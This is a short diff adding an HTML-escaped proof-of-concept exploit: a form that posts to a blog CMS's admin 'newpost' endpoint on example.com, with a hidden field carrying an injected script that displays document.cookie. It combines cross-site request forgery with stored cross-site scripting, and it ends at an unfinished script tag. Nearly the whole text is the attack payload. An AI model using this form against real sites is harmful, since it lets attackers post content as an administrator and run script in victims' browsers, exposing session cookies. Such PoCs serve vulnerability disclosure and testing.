@@ -1,0 +1,9 @@
+&lt;form action=&quot;http://www.example.com/admin.php?module=blog&amp;page=newpost&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;cont1&quot; value=&#039;1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cont2&quot; value=&quot;no category&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cont3&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot; name=&quot;Submit&quot; value=&quot;Save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
